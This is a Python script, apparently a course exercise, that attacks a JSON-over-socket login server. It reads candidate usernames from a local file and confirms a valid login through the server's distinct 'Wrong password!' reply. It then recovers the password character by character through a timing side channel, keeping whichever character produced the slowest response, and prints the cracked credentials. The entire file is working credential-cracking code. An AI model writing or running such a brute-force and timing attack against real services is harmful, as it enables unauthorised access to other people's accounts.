import argparse
import json
import socket
import time
from datetime import datetime, timedelta


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('ip_address', type=str)
    parser.add_argument('port', type=int)
    args = parser.parse_args()
    return args.ip_address, args.port


def letter_generator():
    letters = 'abcdefghijklmnopqrstuvwxyz' \
              'ABCDEFGHIJKLMNOPQRSTUVWXYZ' \
              '0123456789'

    for letter in letters:
        yield letter


def get_login(client):
    with open('/home/misha/logins.txt', 'r') as f:
        for login in f:
            login = login.strip()
            request = json.dumps({'login': login, 'password': ''})
            client.send(request.encode())
            response = json.loads(client.recv(1024).decode())
            if response['result'] == 'Wrong password!':
                return login
    return ''


def get_password(login, client):
    letters = 'abcdefghijklmnopqrstuvwxyz' \
              'ABCDEFGHIJKLMNOPQRSTUVWXYZ' \
              '0123456789'
    password = ''
    password_found = False

    while not password_found:
        response_times = []
        for letter in letters:
            request = json.dumps({'login': login, 'password': password + letter})
            start = datetime.now()
            client.send(request.encode())
            response = json.loads(client.recv(1024).decode())
            end = datetime.now()
            response_times.append(end - start)
            if response['result'] == 'Connection success!':
                password += letter
                password_found = True
                break
        if not password_found:
            max_response_time = max(response_times)
            max_response_index = response_times.index(max_response_time)
            password += letters[max_response_index]

    return password


def main():
    ip_address, port = parse_arguments()

    with socket.socket() as client:
        address = (ip_address, port)
        client.connect(address)
        login = get_login(client)
        password = get_password(login, client)
        credentials = json.dumps({'login': login, 'password': password})
        print(credentials)


if __name__ == '__main__':
    main()
